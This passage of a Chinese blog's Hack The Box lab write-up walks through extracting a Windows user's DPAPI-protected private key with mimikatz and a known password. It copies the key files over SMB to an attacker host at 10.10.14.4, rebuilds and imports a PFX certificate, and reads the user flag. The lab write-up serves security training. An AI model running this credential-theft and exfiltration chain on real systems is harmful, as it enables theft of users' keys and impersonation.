+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.56.38.png" alt="截屏2021-12-26 下午6.56.38"></p>
+<h4 id="获取私钥-1"><a href="#获取私钥-1" class="headerlink" title="获取私钥"></a>获取私钥</h4><p>在<code>C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011</code>找到了一个密钥容器<code>307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\ /a /b</span><br><span class="line">dir C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011 /a /b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.00.08.png" alt="截屏2021-12-26 下午7.00.08"><br>通过 mimikatz 生成对应私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::capi /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.01.43.png" alt="截屏2021-12-26 下午7.01.43"></p>
+<h4 id="解密万能钥匙-1"><a href="#解密万能钥匙-1" class="headerlink" title="解密万能钥匙"></a>解密万能钥匙</h4><p>使用 mimikatz 通过给出的<code>2f452fc5-c6d2-4706-a4f7-1cd6b891c017</code>以及 tolu 的密码来解密该密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::masterkey /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017&quot;</span> /password:!zaq1234567890pl!99</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.07.22.png" alt="截屏2021-12-26 下午7.07.22"><br>拿到 sha1 万能密钥</p>
+<h4 id="解密私钥-1"><a href="#解密私钥-1" class="headerlink" title="解密私钥"></a>解密私钥</h4><p>使用 mimikatz 运行命令解密私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::capi /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.10.12.png" alt="截屏2021-12-26 下午7.10.12"><br>成功生成 pvk 证书，那么还是通过 smb 来传递 pvk 文件和 der 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \windows\system32\spool\drivers\color\raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk \\10.10.14.4\share\</span><br><span class="line">copy \windows\system32\spool\drivers\color\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der \\10.10.14.4\share\</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.16.26.png" alt="截屏2021-12-26 下午7.16.26"></p>
+<h4 id="构建并安装pfx"><a href="#构建并安装pfx" class="headerlink" title="构建并安装pfx"></a>构建并安装pfx</h4><p>使用 openssl 创建一个 pfx 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -outform PEM -<span class="keyword">in</span> 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public-1.pem</span><br><span class="line">openssl rsa -inform PVK -outform PEM -<span class="keyword">in</span> raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk  -out private-1.pem</span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> public-1.pem -inkey private-1.pem -password pass:mac -keyex -CSP <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="built_in">export</span> -out cert-1.pfx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.22.31.png" alt="截屏2021-12-26 下午7.22.31"><br>将生成的 pfx 文件复制回靶机当中并安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.14.4\share\cert-1.pfx \windows\system32\spool\drivers\color\cert-1.pfx</span><br><span class="line">certutil -user -p mac -importpfx \windows\system32\spool\drivers\color\cert-1.pfx NoChain,NoRoot</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.24.40.png" alt="截屏2021-12-26 下午7.24.40"><br>读取 user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\\users\tolu\desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.28.08.png" alt="截屏2021-12-26 下午7.28.08"><br>成功获取第二个flag</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/5bb1bf38/">腾讯云函数的三种常见利用方式<span class="note">Older</span></a><div class="line"></div><a id="prev" href="/post/3d829fa7/">HTB: Legacy<span class="note">Newer</span></a></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
